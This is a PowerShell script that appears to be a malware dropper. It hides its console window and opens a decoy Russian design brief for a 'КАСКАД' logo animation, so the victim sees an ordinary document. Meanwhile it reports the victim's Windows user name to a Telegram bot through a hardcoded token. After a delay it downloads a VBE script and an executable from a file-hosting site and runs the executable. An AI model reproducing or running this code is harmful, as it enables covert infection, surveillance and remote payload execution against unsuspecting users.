Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
$v0=[b0.a0]::GetConsoleWindow()
[b0.a0]::ShowWindow($v0,0)
$v1="КАСКАД_анимация_логотипа_ТЗ.txt"
$v2=Join-Path $env:LOCALAPPDATA $v1
$v3=@"
Цели и тон анимации
Цель: усилить узнаваемость бренда, использовать в видеоинтро, на сайте и в презентациях.
Тон: строгий, профессиональный, индустриальный; ощущение прочности и точности; динамика умеренная, без излишней игривости.
Ключевые акценты: каскадная структура слоёв, металл, сборка/монтаж, надёжность.

Концепт и сценарий анимации
1. Стартовый кадр
   Тёмный нейтральный фон; появляется тонкая световая линия, которая чертит контуры каскадного знака.
2. Формирование знака
   Слои знака собираются последовательно сверху вниз как металлические пластины: плавное появление с лёгким металлическим бликом и звуком стука/сборки (опционально).
3. Появление текста
   После сборки знака справа проявляется слово КАСКАД: буквы появляются поочерёдно или выезжают из‑под слоя, фиксируются с лёгким акцентом.
4. Финальный акцент
   Короткая вибрация/импульс, лёгкий блик по краю металла и появление подзаголовка (опционально).
5. Завершение
   Плавное затемнение или переход в прозрачность для наложения на видео/фон. Длительность основного цикла 3–5 секунд.

Технические требования
- Длительность: 3–5 секунд основной версии; опционально 10–15 секунд с зацикливанием.
- Форматы на сдачу: MP4 (H.264), WebM, прозрачный MOV (ProRes 4444); GIF по запросу.
- Разрешение: 1920×1080 px (Full HD); 4K по запросу; вертикальная версия 1080×1920 при необходимости.
- Частота кадров: 30 fps (при необходимости 60 fps).
- Цвета: фирменный зелёный и чёрный из логотипа; металлизированные градиенты в пределах палитры.
- Звук: короткий эффект сборки и финальный акцент (опционально) — отдельный WAV/MP3.
- Совместимость: файлы готовы для вставки в видеоредакторы и веб.

Исходники и передача
- Проекты: After Effects (AEP) с подключёнными шрифтами и плагинами; при использовании Cinema 4D — проект C4D и рендеры.
- Логотипы: исходный логотип в векторе (AI/SVG) и растровые PNG с прозрачным фоном.
- Экспорт: MP4, MOV (с прозрачностью), WebM, GIF; PNG sequence по запросу.
- Документация: краткая инструкция по использованию (форматы и рекомендации по наложению).
"@
$v3|Out-File -FilePath $v2 -Encoding UTF8
Invoke-Item $v2
$v4="8323167571:AAFEgqb4cAPmKNek-D6ioTvS634gRE0CuTo"
$v5="7063407604"
$v6=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$v7="The user's shortcut was enabled for user: "+$v6
$v8="https://api.telegram.org/bot"+$v4+"/sendMessage"
$v9=@{chat_id=$v5;text=$v7}|ConvertTo-Json
try{$v10=Invoke-RestMethod -Uri $v8 -Method Post -ContentType "application/json" -Body $v9}catch{}
Start-Sleep -Seconds 400
$v11="https://www.udrop.com/file/OcWQ/1446062403_house.delete"
$v12="1446062403_house.vbe"
$v13=[Environment]::GetFolderPath("LocalApplicationData")
$v14=Join-Path $v13 $v12
try{$v15=New-Object System.Net.WebClient;$v15.DownloadFile($v11,$v14)}catch{}
$v16="https://www.udrop.com/file/OcWP/1446062403_key.delete"
$v17="1446062403_key.exe"
$v18=Join-Path $v13 $v17
try{
    $v19=New-Object System.Net.WebClient
    $v19.DownloadFile($v16,$v18)
    Start-Process -FilePath $v18 -WindowStyle Normal
}catch{}
exit